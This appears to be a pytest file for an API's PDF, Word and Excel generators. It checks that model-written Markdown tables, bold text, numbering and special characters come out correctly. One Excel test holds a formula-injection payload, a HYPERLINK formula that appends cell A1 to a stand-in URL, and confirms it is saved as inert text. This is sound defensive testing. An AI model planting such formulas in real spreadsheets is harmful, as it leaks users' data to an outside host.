"""A generated PDF, Word or Excel file says what the model wrote, and only that.

Read back with real readers (pypdf, python-docx, openpyxl), main's generators:

* PDF: "<script>" in the text aborted the whole document (reportlab reads a
  paragraph as markup), "R&D" came out as "R&D;", numbered steps lost their
  numbers, and a Markdown table printed as rows of pipes.
* Word: "**bold**" stayed as literal asterisks in bullets and headings, and a
  table printed as rows of pipes.
* Excel: an empty cell was dropped, so every later value in the row moved one
  column left; text starting with "=" was saved as a live formula; numbers were
  saved as text, so a sum over them was 0.
* Word and Excel refused the whole document over one control character.

The helper tests need no document library. The file tests skip a format whose
library is missing; CI's test job installs all four (requirements-test.txt).
"""
import io
import os
import zipfile

for _k in ("IRA_SECRET_KEY", "IRA_ADMIN_PASSWORD", "POSTGRES_PASSWORD", "REDIS_PASSWORD", "VLLM_API_KEY"):
    os.environ.setdefault(_k, "test-placeholder")

import pytest

from api.routes.document_create import (
    _blocks,
    _generate_docx,
    _generate_pdf,
    _generate_xlsx,
    _table_cells,
    _xlsx_value,
)

TABLE_WITH_EMPTY_CELL = "| Item | Q1 | Q2 |\n|---|---|---|\n| Total |  | 300 |"
CONTROL_CHARACTERS = "Before\x0c a form feed, a NUL\x00 and a vertical tab\x0b. After."


# ── The Markdown reading the three writers share ─────────────────────────────

def test_a_table_row_keeps_its_empty_cells():
    assert _table_cells("| Total |  | 300 |") == ["Total", "", "300"]
    assert _table_cells("Total |  | 300") == ["Total", "", "300"]


def test_a_table_needs_its_delimiter_row():
    assert list(_blocks(TABLE_WITH_EMPTY_CELL)) == [
        ("table", ["Item", "Q1", "Q2"], [["Total", "", "300"]])]
    # A sentence that happens to contain a pipe is a line of text.
    assert list(_blocks("Use a | b for either.")) == [("line", "Use a | b for either.")]


def test_short_table_rows_are_padded_to_the_header():
    (_, header, rows), = _blocks("| A | B | C |\n|---|---|---|\n| 1 |")
    assert rows == [["1", "", ""]]


@pytest.mark.parametrize("text, value", [
    ("3", 3), ("-4.5", -4.5), ("1,200", 1200), ("0.25", 0.25),
    ("007", "007"),                    # an identifier, not seven
    ("1234567890123456", "1234567890123456"),  # past Excel's 15 digits
    ("12,34", "12,34"), ("£5", "£5"), ("5%", "5%"), ("Apples", "Apples"),
])
def test_only_a_plain_number_becomes_a_number(text, value):
    assert _xlsx_value(text) == value
    assert type(_xlsx_value(text)) is type(value)


# ── PDF ───────────────────────────────────────────────────────────────────────

def _pdf_text(content: str) -> str:
    pytest.importorskip("reportlab")
    pypdf = pytest.importorskip("pypdf")
    data = _generate_pdf(content, "Report")
    assert data.startswith(b"%PDF"), "not a PDF"
    return "\n".join(page.extract_text() for page in pypdf.PdfReader(io.BytesIO(data)).pages)


def test_pdf_keeps_markup_characters_as_text():
    text = _pdf_text("R&D spend is < 5% of revenue.\n\nUse the <script> tag carefully.")
    assert "R&D spend is < 5% of revenue." in text
    assert "R&D;" not in text
    assert "Use the <script> tag carefully." in text


def test_pdf_numbered_steps_keep_their_numbers():
    text = _pdf_text("1. Plan\n2. Build\n3. Ship")
    assert "1. Plan" in text and "2. Build" in text and "3. Ship" in text


def test_pdf_bold_markers_do_not_print():
    text = _pdf_text("## **Summary**\n\n- **Owner:** Praveen\n\nThe **key** point.")
    assert "**" not in text
    assert "Summary" in text and "Owner: Praveen" in text and "The key point." in text


def test_pdf_markdown_table_is_a_table_not_pipes():
    text = _pdf_text(TABLE_WITH_EMPTY_CELL)
    assert "|" not in text
    assert "Item" in text and "Total" in text and "300" in text


# ── Word ──────────────────────────────────────────────────────────────────────

def _docx(content: str):
    docx = pytest.importorskip("docx")
    return docx.Document(io.BytesIO(_generate_docx(content, "Report")))


def test_docx_bold_in_bullets_and_headings_is_bold_not_asterisks():
    doc = _docx("## **Summary**\n- **Owner:** Praveen\n1. **First** step")
    body = doc.paragraphs[1:]
    assert [(p.style.name, p.text) for p in body] == [
        ("Heading 2", "Summary"), ("List Bullet", "Owner: Praveen"), ("List Number", "First step")]
    bullet_runs = [(r.text, bool(r.bold)) for r in body[1].runs]
    assert bullet_runs == [("Owner:", True), (" Praveen", False)]


def test_docx_markdown_table_is_a_word_table_with_its_empty_cell():
    doc = _docx(TABLE_WITH_EMPTY_CELL)
    assert not any("|" in p.text for p in doc.paragraphs)
    (table,) = doc.tables
    assert [[c.text for c in row.cells] for row in table.rows] == [
        ["Item", "Q1", "Q2"], ["Total", "", "300"]]
    assert all(r.bold for r in table.rows[0].cells[0].paragraphs[0].runs)


def test_docx_survives_control_characters():
    doc = _docx(CONTROL_CHARACTERS)
    assert doc.paragraphs[1].text == "Before a form feed, a NUL and a vertical tab. After."


# ── Excel ─────────────────────────────────────────────────────────────────────

def _xlsx_bytes(content: str) -> bytes:
    pytest.importorskip("openpyxl")
    return _generate_xlsx(content, "Report")


def _rows(data: bytes) -> list[list]:
    import openpyxl
    ws = openpyxl.load_workbook(io.BytesIO(data)).active
    return [[c.value for c in row] for row in ws.iter_rows(min_row=3) if any(c.value is not None for c in row)]


def test_xlsx_empty_cell_keeps_every_value_in_its_column():
    assert _rows(_xlsx_bytes(TABLE_WITH_EMPTY_CELL)) == [["Item", "Q1", "Q2"], ["Total", None, 300]]


def test_xlsx_text_starting_with_equals_is_text_not_a_formula():
    payload = '=HYPERLINK("https://example.invalid/?"&A1,"open")'
    data = _xlsx_bytes(f"| Name | Note |\n|---|---|\n| A | {payload} |\n\n=1+1")
    sheet_xml = zipfile.ZipFile(io.BytesIO(data)).read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in sheet_xml, "a cell was saved as a formula"
    import openpyxl
    ws = openpyxl.load_workbook(io.BytesIO(data)).active
    cells = {c.value: c.data_type for row in ws.iter_rows() for c in row if c.value is not None}
    assert cells[payload] == "s"
    assert cells["=1+1"] == "s"


def test_xlsx_numbers_are_numbers():
    rows = _rows(_xlsx_bytes("| Item | Qty | Price |\n|---|---|---|\n| Apples | 3 | 1,200.50 |\n| Code | 007 | 5% |"))
    assert rows == [["Item", "Qty", "Price"], ["Apples", 3, 1200.5], ["Code", "007", "5%"]]


def test_xlsx_survives_control_characters():
    assert _rows(_xlsx_bytes(CONTROL_CHARACTERS)) == [["Before a form feed, a NUL and a vertical tab. After."]]
